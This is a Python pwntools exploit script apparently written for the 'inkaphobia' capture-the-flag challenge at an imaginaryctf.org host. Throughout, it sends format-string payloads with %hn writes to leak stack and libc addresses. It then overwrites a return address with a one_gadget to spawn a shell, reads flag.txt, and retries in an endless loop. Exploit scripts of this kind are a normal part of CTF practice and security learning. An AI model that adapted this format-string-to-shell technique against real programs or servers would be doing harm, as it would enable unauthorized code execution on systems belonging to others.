#!/usr/bin/env python3

from pwn import *

from time import sleep

exe = ELF("./inkaphobia_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")


context.binary = exe


def conn():
    r = process([exe.path])
    return r

def s(number):
    return str(number).encode()

def main():
     #r = conn()
    r = remote("chal.imaginaryctf.org", 42008)

    for i in range(6):
        r.sendlineafter("Enter max value: ", "5")
    
    r.recvline()

    payload = b"%c"*90
    payload += b"%" + s(0xdce8-90) + b"c" + b"%hn"
    payload += b"%" + s(0x10000-0xdce8 + 0xa29) + b"c" + b"%105$hn"
    payload += b"|%1$p|%75$p"
    r.sendline(payload)
    r.recvuntil("|")
    stack_leak = int(r.recv(14), 16)

    r.recvuntil("|")
    libc_leak = int(r.recv(14), 16)


    log.warn("Stack leak @ 0x%x", stack_leak)
    log.warn("Libc leak @ 0x%x", libc_leak)

    r.recvline()

    offset = 8

    rip_stack = stack_leak + 0x2698
    libc.address = libc_leak - libc.sym['__libc_start_main'] - 243
    log.warn("Libc address @ 0x%x", libc.address)

    one_gadget = libc.address + 0xe6c81

    payload = fmtstr_payload(offset, {rip_stack:one_gadget})

    r.sendline(payload)
    sleep(1)

    r.sendline("cat flag.txt")

    r.interactive()


if __name__ == "__main__":
    while True:
        try:
            main()
        except:
            pass
